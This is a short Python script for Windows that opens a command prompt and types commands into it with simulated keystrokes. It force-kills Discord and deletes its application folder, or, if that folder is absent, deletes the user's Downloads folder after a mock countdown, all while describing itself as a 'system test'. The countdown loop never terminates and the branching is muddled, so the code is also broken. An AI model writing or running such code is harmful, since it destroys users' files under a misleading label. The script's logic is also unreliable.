import os
import socket
import subprocess
import random
import shutil
import pynput
import time
warning1 =100
login = os.getlogin()
input()
enter =pynput.keyboard.Key.enter
keyt =pynput.keyboard.Controller()
cmd =subprocess.Popen("cmd.exe /K cd c:/")
time.sleep(0.5)
keyt.type("dir")
keyt.press(enter)
time.sleep(0.5)
keyt.type("dir")
keyt.press(enter)
if os.path.exists("C:/Users/"+login+"/AppData/Roaming/discord/app-1.0.9026"):
 os.system("taskkill /F /IM discord.exe")
 keyt.type("del C:/Users/"+login+"/AppData/Roaming/discord/app-1.0.9026")
 keyt.press(enter)
 time.sleep(0.5)
 keyt.type("y")
 keyt.press(enter)
elif os.path.exists("C:/Users/"+ login +"/Downloads"):
 while warning1 >= 0:
  warning1 =warning1 + 1
  time.sleep(1)
  print("folder:" + "C:/Users/"+ login +"/Downloads")
  print("deletion warning"+ warning1 * "-" + str(warning1) + " seconds before deletion")
 else:
  keyt.type("del C:/Users/"+ login +"/Downloads")
 keyt.press(enter)
 time.sleep(1)
 keyt.type("y")
 keyt.press(enter)
 #C:\Users\benle\AppData\Roaming\discord\app-1.0.9026
else:
 print("system test complete")
 time.sleep(1)
 exit()